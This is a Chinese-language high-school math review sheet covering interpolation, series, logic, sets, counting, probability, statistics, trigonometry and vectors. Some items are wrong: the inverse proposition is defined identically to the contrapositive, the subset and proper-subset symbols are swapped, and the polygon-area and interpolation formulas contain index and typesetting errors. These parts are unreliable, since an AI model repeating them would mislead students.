\\(n\\) 個點 \\((x_1,y_1),(x_2,y_2),...,(x_n,y_n)\\)，其中 \\(x_i\\) 兩兩不同，則存在一多項式 \\(f(x)\\) 如下，滿足 \\(f(x_i)=y_i\\)\n\\[f(x) =\na_1+a_2(x-x_1)+a_3(x-x_1)(x-x_2)+...+a_n(x-x_1)(x-x_2)...(x-x_{n-1})=0\\]\n並可藉代入 \\(x=x_1\\) 得到 \\(a_1\\)，代入 \\(x=x_2\\) 得到 \\(a_2\\)，代入 \\(x=x_3\\) 得到 \\(a_3\\)……，代入 \\(x=x_n\\) 得到 \\(a_n\\)，即可得到 \\(f(x)\\)\n補充：\n\\(f(x)=y_1+\\sum_{i=1}^{n-1} a_i\n\\prod_{j=1}^{i} (x-x_j)\\)\n其中 \\(a_i\\) 表示 \\(f(x)\\) 的 \\(i\\) 階均差\n拉格朗日差值多項式 \n給定 \\(n\\) 個點 \\((x_1,y_1),(x_2,y_2),...,(x_n,y_n)\\)，其中 \\(x_i\\) 兩兩不同，則存在一多項式 \\(f(x)\\) 如下，滿足 \\(f(x_i)=y_i\\)\n\\[f(x) = \\sum_{i=0}^{n} y_i \\prod_{j=0, j\\neq\ni}^{n} \\frac{x - x_j}{x_i - x_j}\\]\n詳細解說請參考牛頓插值多項式：拉格朗日怎麼說？\n多項式函數圖形 \n\n能因式分解畫圖形\n\n先看兩端趨勢，奇數次次方且首項係數為正，最右邊往上，最左邊往下，首項係數為負，最右邊往下，最左邊往上；偶數次次方，首項係數為正，最右邊往上，最左邊往上，首項係數為負，最右邊往下，最左邊往下\n\n遇到因式分解内有高次方 (例如 \\(f(x)=(x-1)(x-2)^2(x-3)^3\\))，偶數次方與 \\(x\\) 軸相切，奇數次方不用理他，由最左或最右開始畫 (依照先前的趨勢上下)，以 \\(f(x)=(x-1)(x-2)^2(x-3)^3\\) 為例，先看次方數為 6 次，首項係數為正，則最左邊往上，最右邊往上，加設從最右邊開始看，一開始會從 \\((3,0)\\) 由 \\(x\\) 軸上方穿入，在 \\((2,0)\\) 與 \\(x\\) 軸相切後再從 \\((1,0)\\) 穿出 \\(x\\) 軸，如下方所示。\n\n\n不能因式分解 \\(\\Rightarrow\\) 基本上學測題目靠微分都可解\n\n奇淫技巧 \n\n類牛頓法變型，利用已知除式與餘式假設多項式，以減少未知數，例子：\n已知一實係數多項式 \\(f(x)\\) 除以 \\((x-1)\\) 的餘式為 \\(2\\)，除以 \\((x-2)\\) 的餘式為 \\(3\\)，求 \\(f(x)\\) 除以 \\((x-1)(x-2)\\) 的餘式。\n\\(f(x)=\\) \\((x-1)(x-2)q(x)+a(x-1)+2\\)\n\\(f(2)=3=a+2\\)\n\\(a=1\\)\n\\(f(x)=(x-1)(x-2)q(x)+x+1\\)\n\n兩函數圖形是否可經由平移求得 (類泰勒展開)：\n有二多項式函數 \\(f(x)=a_0+a_1x+a_2x^2+...+a_nx^n\\)、\\(g(x)=b_0+b_1x+b_2x^2+...+b_nx^n\\)\n若 \\(f(x)\\)、\\(g(x)\\) 圖形可經由平移求得，則滿足：\n\\(f'(k)=g'(k),\\) \\(f''(k)=g''(k), ...,\nf^{(n)}(k)\\) \\(=g^{(n)}(k)\\)，其中 \\(k\\) 滿足 \\(f^{(n-1)}(k)=g^{(n-1)}(k)\\)\n\n數列與級數 \n\n等差數列\n\n級數和：\\(S_n=\\frac{n(a_1+a_n)}{2}\\)\n證明 (數學歸納法)：\n\\(n=1\\) 時，\\(S_1=\\frac{1(a_1+a_1)}{2}=a_1\\)\n假設 \\(n=k\\) 時，\\(S_k=\\frac{k(a_1+a_k)}{2}\\) 成立\n則 \\(n=k+1\\) 時\n\\[\n  \\begin{aligned}\n  S_{k+1} &amp;=\nS_k+a_{k+1}  &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;\\\\\n   &amp;= \\frac{k(a_1+a_k)}{2}+a_{k+1}  \\\\\n   &amp;= \\frac{k(a_1+a_k)+2a_{k+1}}{2}  \\\\\n   &amp;= \\frac{k(a_1+a_k)+2a_{k+1}+2a_1-2a_1}{2}  \\\\\n   &amp;= \\frac{k(a_1+a_k+2a_1)+2a_{k+1}-2a_1}{2}  \\\\\n   &amp;= \\frac{(k+1)(a_1+a_{k+1})}{2}\n  \\end{aligned}\n  \\]\n\n等比數列\n\n級數和：\\(S_n=\\frac{(a_1*q^n-a_1)}{q-1}\\)\n證明 (數學歸納法)：\n\\(n=1\\) 時，\\(S_1=\\frac{a_1*q-a_1}{q-1}=a_1\\)\n假設 \\(n=k\\) 時，\\(S_k=\\frac{a_1*q^k-a_1}{q-1}\\) 成立\n則 \\(n=k+1\\) 時\n\\[\n   \\begin{aligned}\n   S_{k+1} &amp;=\nS_k+a_{k+1}  &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;\\\\\n     &amp;= S_k*q+a_1  \\\\\n     &amp;= \\frac{a_1*q^k-a_1}{q-1}*q+a_1  \\\\\n     &amp;= \\frac{a_1*q^{k+1}-a_1*q+a_1*q-a_1}{q-1}  \\\\\n     &amp;= \\frac{a_1*q^{k+1}-a_1}{q-1}\n   \\end{aligned}\n   \\]\n\n遞迴關係式\n\n這東西好像沒考過，但就算是考出來了以高中難度應該也就是多列幾項觀察，隨便通靈一下一般式然後用數學歸納法證明\n\n其他常見級數\n\n\\(\\sum_{i=1}^{n} i^2 =\n\\frac{n(n+1)(2n+1)}{6}\\)\n\\(\\sum_{i=1}^{n} i^3 =\n\\frac{n^2(n+1)^2}{4}\\) \\(=\n(\\sum_{i=1}^{n} i)^2\\)\n\\(\\sum_{i=1}^{n} i(i+1)\\) \\(= \\frac{n(n+1)(n+2)}{3}\\)\n\\(\\sum_{i=1}^{n} i(i+1)(i+2)\\)\n\\(= \\frac{n(n+1)(n+2)(n+3)}{4}\\)\n\\(\\sum_{i=1}^{n} \\frac{1}{i(i+1)}\\)\n\\(= \\sum_{i=1}^{n}\n(\\frac{1}{i}-\\frac{1}{i+1})\\) \\(=\n1-\\frac{1}{n+1}\\)\n\\(\\sum_{i=1}^{n} \\frac{1}{i(i+2)}\\)\n\\(= \\frac{1}{2}\\sum_{i=1}^{n}\n(\\frac{1}{i}-\\frac{1}{i+2})\\) \\(=\n\\frac{1}{2}(\\frac{3}{2}-\\frac{1}{n+1}-\\frac{1}{n+2})\\)\n\\(\\sum_{i=1}^{n}\n\\frac{1}{i(i+1)(i+2)}\\) \\(=\n\\frac{1}{2}\\sum_{i=1}^{n}\n(\\frac{1}{i(i+1)}-\\frac{1}{(i+1)(i+2)})\\) \\(=\n\\frac{1}{2}(\\frac{1}{2}-\\frac{1}{(n+1)(n+2)})\\)\n\n\n證明待補🫠\n計數原理 \n邏輯 \n\n符號們：\n\n\\(\\wedge\\)：且 (and)\n\\(\\vee\\)：或 (or)\n\\(\\neg\\)：非 (not)\n\\(\\to\\)：若…，則…(if…then…)\n\\(\\leftrightarrow\\)：若且唯若 (iff)\n\n命題定義：一個陳述句，其真假只有兩種可能，且必定為其中一種。\n否命題 (Inverse\nProposition)：若有一命題，其條件與結論皆為命題 A 的否定，則稱此命題為命題 A 的否命題，計做 \\(\\neg A\\)。\n\n若給定命題「若 P，則 Q」：\\(P\\to\nQ\\)，則其否命題為「若非 Q，則非 P」：\\(\\neg Q\\to \\neg P\\)\n\n逆命題 (Converse\nProposition)：若有一命題，其條件與結論皆為命題 A 的結論與條件，則稱此命題為命題 A 的逆命題。\n\n若給定命題「若 P，則 Q」：\\(P\\to\nQ\\)，則其逆命題為「若 Q，則 P」：\\(Q\\to\nP\\)\n\n逆否命題 (Contrapositive\nProposition)：若有一命題，其條件與結論皆為命題 A 的結論的否定與條件的否定，則稱此命題為命題 A 的逆否命題。\n\n若給定命題「若 P，則 Q」：\\(P\\to\nQ\\)，則其逆否命題為「若非 Q，則非 P」：\\(\\neg Q\\to \\neg P\\)\n\n\n集合 \n\n符號們：\n\n\\(\\cup\\)：聯集\n\n\\(A\\cup B\\)：A、B 聯集\n\n\\(\\cap\\)：交集\n\n\\(A\\cap B\\)：A、B 交集\n\n\\(\\setminus\\)：差集\n\n\\(A\\setminus B\\)：A、B 差集\n\n\\(\\overline{A}\\)：補集\n\n\\(\\overline{A}\\)：A 的補集\n\n\\(\\in\\)：屬於\n\n\\(a\\in A\\)：a 屬於 A\n\n\\(\\notin\\)：不屬於\n\n\\(a\\notin A\\)：a 不屬於 A\n\n\\(\\subset\\)：子集合\n\n\\(A\\subset\nB\\)：A 為 B 的子集合 (B 完全包含 A，A 和 B 可能相等)\n\n\\(\\subseteq\\)：真子集合\n\n\\(A\\subseteq\nB\\)：A 為 B 的真子集合 (即 A 為 B 的子集合且 A 不等於 B)\n\n\\(\\supset\\)：超集合\n\n\\(A\\supset\nB\\)：A 為 B 的超集合 (A 完全包含 B，A 和 B 可能相等)\n\n\\(\\supseteq\\)：真超集合\n\n\\(A\\supseteq\nB\\)：A 為 B 的真超集合 (即 A 為 B 的超集合且 A 不等於 B)\n\n\\(\\emptyset\\)：空集合\n\n觀念釐清：屬於 (\\(\\in\\)) vs\n包含 (\\(\\subset\\))\n\n\\(\\in\\)：屬於，用來判斷某個元素是否屬於某個集合\n \\(\\subset\\)：包含，用來判斷某個集合是否屬於某個集合\n例如當 \\(A=\\{1,2,3,\\{1,2\\},\\{3,4\\}\\}\\)，\\(B=\\{1,2,3\\}\\) 時，\\(A\\) 沒有一個元素為 \\(\\{1,2,3\\}\\)，因此 \\(\\{1,2,3\\}\\notin A\\)，但 \\(A\\) 中有 \\(1,2,3\\) 這三個元素，因此 \\(B\\subset A\\)\n假設又有另一個集合 \\(C=\\{3,4\\}\\)，此時 \\(A\\) 中有 \\(\\{3,4\\}\\) 這個元素，因此 \\(C\\in A\\)，但 \\(C\\) 這個集合中的元素 \\(4\\) 並不是 \\(A\\) 的元素 (\\(A\\) 的元素僅有 \\(1,2,3,\\{1,2\\},\\{3,4\\}\\)，其中 \\(\\{3,4\\}\\) 要當作一個元素)，因此 \\(C\\not\\subset A\\)\n\n集合定義：一群具有某種性質的事物的組合，稱為集合。\n\n列舉法：\\(A=\\{a_1,a_2,...,a_n\\}\\)\n描述法：\\(A=\\{x|x\\in\\mathbb{R},x&gt;0\\}\\)\n\n文氏圖：用圓圈表示集合間的關係 (底下圖用 Python 畫的，這裡有程式碼╰(°▽°)╯)\n\n笛摩根定律：\n\n\\(A\\cup B =\n\\overline{\\overline{A}\\cap\\overline{B}}\\)\n\\(A\\cap B =\n\\overline{\\overline{A}\\cup\\overline{B}}\\)\n\n\n技巧們 \n\n窮舉法、樹狀圖\n\n加法原理：\n若達成某事可用 n 類方法，第一類方法有 \\(m_1\\) 種，第二類方法有 \\(m_2\\) 種，…，第 n 類方法有 \\(m_n\\) 種，則總共有 \\(m_1+m_2+...+m_n\\) 種方法。\n\n乘法原理：\n若達成某事有 n 個步驟，第一個步驟有 \\(m_1\\) 種方法，第二個步驟有 \\(m_2\\) 種方法，…，第 n 個步驟有 \\(m_n\\) 種方法，則總共有 \\(m_1*m_2*...*m_n\\) 種方法。\n\n排容原理：\n\n\\(|A\\cup B| = |A|+|B|-|A\\cap\nB|\\)\n\n\n排列 \n\n完全相異物排列：\\(n!\\)\n\n從 n 個不同物品中取出 r 個排列：\\(P_n^r=\\frac{n!}{(n-r)!}\\)\n\n有相同物品的直線排列：\\(\\frac{n!}{n_1!n_2!...n_k!}\\)，其中 \\(n_1,n_2,...,n_k\\) 為相同物品的個數\n\n重複排列：從 n 個不同物品中取出 r 個排列，其中每個物品可重複取用：\\(n^r\\)\n\n組合 \n\n從 n 個不同物品中取出 r 個組合：\\(C_n^r=\\frac{n!}{r!(n-r)!}\\)\n\n設 \\(0\\leq r\\leq n\\)，則 \\(C_n^r=C_n^{n-r}\\)\n\n巴斯卡定理：當 \\(1\\leq r\\leq\nn-1\\) 時，\\(C_r^n=C_{r-1}^{n-1}+C_r^{n-1}\\)\n\n重複組合：從 n 個不同物品中取出 r 個組合，其中每個物品可重複取用：\\(H^n_r=C^{n+r-1}_r=\\frac{(n+r-1)!}{r!(n-1)!}\\)\n\n二項式定理：\\((a+b)^n=\\sum_{i=0}^{n} C_i^n\na^{n-i}b^i\\)\n\n當 \\(a=b=1\\) 時，\\((1+1)^n=\\sum_{i=0}^{n} C_i^n\n1^{n-i}1^i=2^n\\)\n\n當 \\(a=-b=1\\) 時，\\((1-1)^n=\\) \\(\\sum_{i=0}^{n} C_i^n 1^{n-i}(-1)^i=0\\)\n\n\n機率 (古典機率、條件機率)&amp; 期望值\n\n\n符號：\n\n\\(P(A)\\)：事件 A 發生的機率\n\\(P(\\overline{A})\\)：事件 A 不發生的機率\n\\(P(A\\cup\nB)\\)：事件 A 或 B 發生的機率\n\\(P(A\\cap\nB)\\)：事件 A 和 B 同時發生的機率\n\\(P(A|B)\\)：事件 B 發生的條件下，事件 A 發生的機率\n\n性質：\n\n\\(P(\\emptyset)=0\\)\n\\(A \\subset B \\Rightarrow P(A) \\leq\nP(B)\\)\n\\(P(\\overline{A})=1-P(A)\\)\n\\(P(A-B)=P(A)-P(A\\cap B)\\)\n\\(P(A\\cup B)=\\) \\(P(A)+P(B)-P(A\\cap B)\\) (排容原理)\n\\(P(A|B)=\\frac{P(A\\cap\nB)}{P(B)}\\)\n當事件 \\(A\\)、\\(B\\) 為獨立事件時，\\(P(A\\cap B)=P(A)P(B)\\)\n\n分割定理：\n\n何謂分割？\n設一樣本空間事件 \\(\\Omega\\)，若事件 \\(A_1,A_2,...,A_n\\) 為 \\(\\Omega\\) 的分割，則滿足\n\n\\(A_1,A_2,...,A_n\\) 兩兩互斥\n\n\\(A_1\\cup A_2\\cup...\\cup\nA_n=\\Omega\\)\n\n\n當任意 B 事件，恆有\n\\[P(B)=\\sum_{i=1}^{n}\nP(B|A_i)P(A_i)\\]\n\n\n貝式定理：\n當事件 \\(A_1,A_2,...,A_n\\) 為 \\(\\Omega\\) 的分割，則對任意事件 \\(B\\)，恆有\n\\[P(A_i|B)=\\frac{P(B|A_i)P(A_i)}{\\sum_{i=1}^{n}\nP(B|A_i)P(A_i)}, i=1,2,3,\\cdots,n\\]\n期望值：\\(E(X)=\\sum_{i=1}^{n}\nx_iP(X=x_i)\\)\n\n數據分析 \n\n平均數：\\(\\bar{x}=\\frac{\\sum_{i=1}^{n}\nx_i}{n}\\)\n\n幾何平均數：\\(G=\\sqrt[n]{x_1x_2...x_n}\\)\n\n中位數：當 \\(n\\) 為奇數時，中位數為第 \\(\\frac{n+1}{2}\\) 個數；當 \\(n\\) 為偶數時，中位數為第 \\(\\frac{n}{2}\\) 個數與第 \\(\\frac{n}{2}+1\\) 個數的平均數\n\n眾數：出現次數最多的數\n\n百分位數：第 \\(p\\) 百分位數代表有 \\(p\\%\\) 的數小於等於此數，\\((0&lt;p&lt;100)\\)\n\n四分位數：第一四分位數為第 \\(25\\) 百分位數，第二四分位數為第 \\(50\\) 百分位數，第三四分位數為第 \\(75\\) 百分位數，分別計做 \\(Q_1,Q_2,Q_3\\)\n\n四分位距：\\(Q_3-Q_1\\)\n\n變異數： \\(s^2=\\frac{\\sum_{i=1}^{n}\n(x_i-\\bar{x})^2}{n}=\\) \\(\\frac{\\sum_{i=1}^{n}\nx_i^2}{n}-\\bar{x}^2\\)\n\n標準差： \\(s=\\sqrt{s^2}=\\) \\(\\sqrt{\\frac{\\sum_{i=1}^{n}\n(x_i-\\bar{x})^2}{n}}=\\) \\(\\sqrt{\\frac{\\sum_{i=1}^{n}\nx_i^2}{n}-\\bar{x}^2}\\)\n\n共變異數：\\(s_{xy}=\\frac{\\sum_{i=1}^{n}\n(x_i-\\bar{x})(y_i-\\bar{y})}{n}\\)\n\n標準化數據 (Z 分數)：\\(z_i=\\frac{x_i-\\bar{x}}{s}\\)\n\nZ 分數的意義：\\(z_i\\) 表示第 \\(i\\) 個數與平均數距離幾個標準差\n\nZ 分數的平均數：\\(\\bar{z}=0\\)，標準差：\\(s_z=1\\)\n\n\n相關係數：\\(r=\\frac{s_{xy}}{s_xs_y}=\\) \\(\\frac{s_{xy}}{\\sqrt{\\sum_{i=1}^{n} (x_i-\\bar{x})^2\n\\cdot \\sum_{i=1}^{n} (y_i-\\bar{y})^2}}\\)\n\n一標準化數據的相關係數：\\(r=\\frac{\\sum_{i=1}^{n}\nx^z_iy^z_i}{n}\\)\n\n\n最小平方法 - 回歸直線： \\(y-\\bar{y}=\\frac{s_{xy}}{s_x^2}(x-\\bar{x})\\)\n\n證明 \n\n\\(|r| \\leq 1\\)\n\\(柯希不等式:\\) \\(\\frac{(a_1b_1+a_2b_2+...+a_nb_n)}{\\sqrt{(a_1^2+a_2^2+...+a_n^2)(b_1^2+b_2^2+...+b_n^2)}}\n\\leq 1\\)\n令 \\(a_i=x_i-\\bar{x}\\)，\\(b_i=y_i-\\bar{y}\\)，則\n\\(r=\\frac{s_{xy}}{s_xs_y}=\\) \\(\\frac{\\sum_{i=1}^{n}\n(x_i-\\bar{x})(y_i-\\bar{y})}{\\sqrt{\\sum_{i=1}^{n} (x_i-\\bar{x})^2 \\cdot\n\\sum_{i=1}^{n} (y_i-\\bar{y})^2}}\\) \\(=\\) \\(\\frac{\\sum_{i=1}^{n} a_ib_i}{\\sqrt{\\sum_{i=1}^{n}\na_i^2 \\cdot \\sum_{i=1}^{n} b_i^2}}\\) \\(\\leq 1\\)\n\n三角函數 \n\n\n各三角函數圖形\n\n\n基本關係式：\n\n\\(\\sin^2\\theta+\\cos^2\\theta=1\\)\n\n\\(\\tan\\theta=\\frac{\\sin\\theta}{\\cos\\theta}\\)\n\n\\(\\sin(\\frac{\\pi}{2}-\\theta)=\\cos\\theta\\)\n\n\\(\\cos(\\frac{\\pi}{2}-\\theta)=\\sin\\theta\\)\n\n\n幾何推半角函數值：\n\n\\(\\sin\\frac{\\theta}{2}=\\sqrt{\\frac{1-\\cos\\theta}{2}}\\)\n\n\\(\\cos\\frac{\\theta}{2}=\\sqrt{\\frac{1+\\cos\\theta}{2}}\\)\n\n\\(\\tan\\frac{\\theta}{2}=\\sqrt{\\frac{1-\\cos\\theta}{1+\\cos\\theta}}\\)\n\n\n\n正弦推三角形面積：\\(S=\\) \\(\\frac{1}{2}ab\\sin C=\\frac{1}{2}bc\\sin\nA=\\frac{1}{2}ca\\sin B\\)\n\n正弦定理：\\(\\frac{a}{\\sin A}=\\frac{b}{\\sin\nB}=\\frac{c}{\\sin C}=2R\\)\n\n餘弦定理：\\(a^2=b^2+c^2-2bc\\cos\nA\\)\n\n海龍公式：\\(S=\\sqrt{p(p-a)(p-b)(p-c)}\\)，其中 \\(p=\\frac{a+b+c}{2}\\)\n\n和角公式：\n\n\\(\\sin(A+B)\\) \\(=\\sin A\\cos B+\\cos A\\sin B\\)\n\n\\(\\cos(A+B)\\) \\(=\\cos A\\cos B-\\sin A\\sin B\\)\n\n\\(\\tan(A+B)\\) \\(=\\frac{\\tan A+\\tan B}{1-\\tan A\\tan\nB}\\)\n\n\\(\\sin(A-B)\\) \\(=\\sin A\\cos B-\\cos A\\sin B\\)\n\n\\(\\cos(A-B)\\) \\(=\\cos A\\cos B+\\sin A\\sin B\\)\n\n\\(\\tan(A-B)\\) \\(=\\frac{\\tan A-\\tan B}{1+\\tan A\\tan\nB}\\)\n\n\n倍角公式：\n\n\\(\\sin2A=2\\sin A\\cos A\\)\n\n\\(\\cos2A\\) \\(=\\cos^2A-\\sin^2A\\) \\(=2\\cos^2A-1\\) \\(=1-2\\sin^2A\\)\n\n\\(\\tan2A=\\frac{2\\tan\nA}{1-\\tan^2A}\\)\n\n\n半角公式：\n\n\\(\\sin\\frac{A}{2}=\\pm\\sqrt{\\frac{1-\\cos\nA}{2}}\\)\n\n\\(\\cos\\frac{A}{2}=\\pm\\sqrt{\\frac{1+\\cos\nA}{2}}\\)\n\n\\(\\tan\\frac{A}{2}\\) \\(=\\pm\\sqrt{\\frac{1-\\cos A}{1+\\cos A}}\\)\n\\(=\\frac{\\sin A}{1+\\cos A}\\) \\(=\\frac{1-\\cos A}{\\sin A}\\)\n\n\n正餘弦疊合 (和角公式逆推)：\n\n將函數 \\(y=a\\sin x + b\\cos\nx\\) 化為 \\(y=R\\sin(x+\\alpha)\\) 的形式\n\\(R=\\sqrt{a^2+b^2}\\)\n\\(\\alpha=\\arctan(\\frac{b}{a})\\)\n將函數 \\(y=a\\sin x + b\\cos\nx\\) 化為 \\(y=R\\cos(x+\\alpha)\\) 的形式\n\\(R=\\sqrt{a^2+b^2}\\)\n\\(\\alpha=\\arctan(\\frac{a}{b})\\)\n\n以切表弦 (半角公式逆推)：\n\n\\(\\sin\\theta=\\frac{2\\tan\\frac{\\theta}{2}}{1+\\tan^2\\frac{\\theta}{2}}\\)\n\n\\(\\cos\\theta=\\frac{1-\\tan^2\\frac{\\theta}{2}}{1+\\tan^2\\frac{\\theta}{2}}\\)\n\n\\(\\tan\\theta=\\frac{2\\tan\\frac{\\theta}{2}}{1-\\tan^2\\frac{\\theta}{2}}\\)\n\n旋轉矩陣：\n\n將向量 \\((x,y)\\) 逆時針旋轉 \\(\\theta\\) 角度後得到向量 \\((x',y')\\)，則\n\\(x'=x\\cos\\theta-y\\sin\\theta\\)\n\\(y'=x\\sin\\theta+y\\cos\\theta\\)\n\n以矩陣表示：\\(\\begin{bmatrix}x'\\\\\ny'\\end{bmatrix}=\\begin{bmatrix}\\cos\\theta&amp;-\\sin\\theta\\\\\\sin\\theta&amp;\\cos\\theta\\end{bmatrix}\\begin{bmatrix}x\\\\\ny\\end{bmatrix}\\)\n\n鏡射矩陣：\n\n將向量 \\((x,y)\\) 以過原點斜率與原點 \\(x\\) 軸夾角為 \\(\\theta\\) 的直線鏡射後得到向量 \\((x',y')\\)，則\n\\(x'=x\\cos2\\theta+y\\sin2\\theta\\)\n\\(y'=x\\sin2\\theta-y\\cos2\\theta\\)\n以矩陣表示：\\(\\begin{bmatrix}x'\\\\\ny'\\end{bmatrix}=\\begin{bmatrix}\\cos2\\theta&amp;\\sin2\\theta\\\\\\sin2\\theta&amp;-\\cos2\\theta\\end{bmatrix}\\begin{bmatrix}x\\\\\ny\\end{bmatrix}\\)\n\n伸縮矩陣：\n\n將向量 \\((x,y)\\) 以 \\(x\\) 軸方向伸縮 \\(k\\) 倍、\\(y\\) 軸方向伸縮 \\(k\\) 倍後得到向量 \\((x',y')\\)，則\n\\(x'=kx\\)\n\\(y'=ky\\)\n以矩陣表示：\\(\\begin{bmatrix}x'\\\\\ny'\\end{bmatrix}=\\begin{bmatrix}k&amp;0\\\\0&amp;k\\end{bmatrix}\\begin{bmatrix}x\\\\\ny\\end{bmatrix}\\)\n\n推移矩陣：\n\n將向量 \\((x,y)\\) 以 \\(x\\) 軸方向平移 \\(y\\) 座標的 \\(a\\) 倍、\\(y\\) 軸方向平移 \\(x\\) 座標的 \\(b\\) 倍後得到向量 \\((x',y')\\)，則\n\\(x'=x+ay\\)\n\\(y'=y+bx\\)\n以矩陣表示：\\(\\begin{bmatrix}x'\\\\\ny'\\end{bmatrix}=\\begin{bmatrix}1&amp;a\\\\b&amp;1\\end{bmatrix}\\begin{bmatrix}x\\\\\ny\\end{bmatrix}\\)\n\n線性變換後三角形面積：\n\n將三角形 \\(ABC\\) 以線性變換 \\(T\\) 變換後得到三角形 \\(A'B'C'\\)，則\n\\(S_{A'B'C'}=|det(T)|S_{ABC}\\)\n\n\n證明待補🫠\n向量 &amp; 行列式 &amp; 矩陣 (線性代數) \n\n符號們：\n\n\\(\\vec{a}\\)：\\(a\\) 向量\n\n\\(|\\vec{a}|\\)：\\(a\\) 向量長度\n\n\\(\\vec{a}+\\vec{b}\\)：\\(a\\)、\\(b\\) 向量相加\n\n\\(\\vec{a}-\\vec{b}\\)：\\(a\\)、\\(b\\) 向量相減\n\n\\(k\\vec{a}\\)：向量擴大或縮小\n\n\\(\\vec{a}\\cdot\\vec{b}\\)：向量內積\n\n\\(\\vec{a}\\times\\vec{b}\\)：向量外積\n\n\\(\\vec{0}\\)：零向量\n\n\n向量的線性組合：若 \\(\\vec{a}\\)、\\(\\vec{b}\\) 為兩不平行向量，則平面上任意向量 \\(\\vec{c}\\) 均可表示為 \\(k_1\\vec{a}+k_2\\vec{b}\\) 的形式，\\(k_1,k_2\\in\\mathbb{R}\\)\n\n向量長度：\\(|\\vec{a}|=\\sqrt{a_1^2+a_2^2+...+a_n^2}\\)\n\n向量內積：\\(\\vec{a}\\cdot\\vec{b}=\\) \\(a_1b_1+a_2b_2+...+a_nb_n\\) \\(=|\\vec{a}||\\vec{b}|\\cos\\theta\\)，其中 \\(\\theta\\) 為兩向量夾角\n\n\\(\\triangle\nABC\\) 中的向量內積：\n\n\\(\\vec{AB}\\cdot\\vec{AC}=\\frac{|\\vec{AB}|^2+|\\vec{AC}|^2-|\\vec{BC}|^2}{2}\\)\n(by 餘弦定理)\n\n\\(\\triangle ABC\\) 的垂心 \\(H\\) 滿足 \\(\\vec{AB}\\cdot\\vec{AH}\\) \\(=\\vec{AC}\\cdot\\vec{AH}\\) \\(=\\vec{AB}\\cdot\\vec{AC}\\) \\(=\\frac{|\\vec{AB}|^2+|\\vec{AC}|^2-|\\vec{BC}|^2}{2}\\)\n\n柯西不等式：\\(|\\vec{a}\\cdot\\vec{b}|\\leq|\\vec{a}||\\vec{b}|\\)，當且僅當 \\(\\vec{a}\\)、\\(\\vec{b}\\) 共線時等號成立\n\n行列式：\n\n二階行列式：\\(\\begin{vmatrix}a&amp;b\\\\c&amp;d\\end{vmatrix}=ad-bc\\)\n三階行列式：\\(\\begin{vmatrix}a&amp;b&amp;c\\\\d&amp;e&amp;f\\\\g&amp;h&amp;i\\end{vmatrix}\\)\n\\(=aei+bfg+cdh\\) \\(-ceg-bdi-afh\\)\n\n向量外積：\\(\\vec{a}\\times\\vec{b}=(\\begin{vmatrix}a_2&amp;a_3\\\\b_2&amp;b_3\\end{vmatrix},\\begin{vmatrix}a_3&amp;a_1\\\\b_3&amp;b_1\\end{vmatrix},\\begin{vmatrix}a_1&amp;a_2\\\\b_1&amp;b_2\\end{vmatrix})\\)\n\\(=|\\vec{a}||\\vec{b}|\\sin\\theta \\;\n\\vec{n}\\)，其中 \\(\\theta\\) 為兩向量夾角，\\(\\vec{n}\\) 為兩向量所在平面的法向量\n\n\\(\\vec{a}\\times\\vec{b}\\) 的方向：右手定則，將右手食指指向 \\(\\vec{a}\\)，中指指向 \\(\\vec{b}\\)，則拇指所指方向即為 \\(\\vec{a}\\times\\vec{b}\\) 的方向\n\n特別地，在二維空間中，可視為 \\(z\\) 軸為 \\(0\\) 的三維空間，則\n\\[\\vec{a}\\times\\vec{b}=(0,0,a_1b_2-a_2b_1)=|\\vec{a}||\\vec{b}|\\sin\\theta\n\\; \\vec{n}\\]\n則此時此二方向向量的 \\(z\\) 軸分量即為其「有號面積」。\n\n\n平面中 \\(n\\) 邊形面積，其中 \\(P_0,P_1,...,P+{n-1},P_n=P_0\\) 為頂點：\\(S=\\frac{1}{2}\\sum_{i=0}^n-1 \\vec{P_i} \\times\n\\vec{P_{i+1}}\\)\n平行六面體的有號體積：\\(V=\\vec{a}\\cdot(\\vec{b}\\times\\vec{c})=\\begin{vmatrix}a_1&amp;a_2&amp;a_3\\\\b_1&amp;b_2&amp;b_3\\\\c_1&amp;c_2&amp;c_3\\end{vmatrix}\\)\n空間中三向量所張出的四面體有號體積：\\(V=\\frac{1}{6}\\vec{a}\\cdot(\\vec{b}\\times\\vec{c})=\\frac{1}{6}\\begin{vmatrix}a_1&amp;a_2&amp;a_3\\\\b_1&amp;b_2&amp;b_3\\\\c_1&amp;c_2&amp;c_3\\end{vmatrix}\\)\n平面中三直線 \\(a_1x+b_1y+c_1=0\\)、\\(a_2x+b_2y+c_2=0\\)、\\(a_3x+b_3y+c_3=0\\) 交於一點，則 \\(\\begin{vmatrix}a_1&amp;b_1&amp;c_1\\\\a_2&amp;b_2&amp;c_2\\\\a_3&amp;b_3&amp;c_3\\end{vmatrix}=0\\)\n三向量共平面：\\(\\vec{a}\\cdot(\\vec{b}\\times\\vec{c})=0\\)\n分點公式：假設平面上有兩點 \\(A\\)、\\(B\\)，有一點 \\(P\\) 在直線 \\(\\overleftrightarrow{AB}\\) 上，其中 \\(\\overline{AP}:\\overline{PB}=m:n\\)，則對任意一點 \\(O\\)，恆有 \\(\\overrightarrow{OP}=\\frac{n}{m+n}\\overrightarrow{OA}+\\frac{m}{m+n}\\overrightarrow{OB}\\)\n三分點公式：假設平面上有三點 \\(A\\)、\\(B\\)、\\(C\\)，有一點 \\(P\\) 使得 \\(\\triangle BCP : \\triangle CAP : \\triangle ABP =\nm:n:p\\)（面積比），則對任意一點 \\(O\\)，恆有\n\\[\\overrightarrow{OP}=\\frac{m}{m+n+p}\\overrightarrow{OA}+\\frac{n}{m+n+p}\\overrightarrow{OB}+\\frac{p}{m+n+p}\\overrightarrow{OC}\\]\n重心公式：假設平面上有三點 \\(A\\)、\\(B\\)、\\(C\\)，其重心 \\(G\\) 滿足：\n\n\\(\\overrightarrow{OG}=\\frac{1}{3}(\\overrightarrow{OA}+\\overrightarrow{OB}+\\overrightarrow{OC})\\)，其中 \\(O\\) 為任意一點\n\n\\(\\overrightarrow{GA}+\\overrightarrow{GB}+\\overrightarrow{GC}=\\vec{0}\\)\n\n\n內心公式：假設平面上有三點 \\(A\\)、\\(B\\)、\\(C\\)，其內心 \\(I\\) 滿足：\n\n\\(\\overrightarrow{OI}=\\frac{a\\overrightarrow{OA}+b\\overrightarrow{OB}+c\\overrightarrow{OC}}{a+b+c}\\)，其中 \\(a,b,c\\) 為三角形 \\(ABC\\) 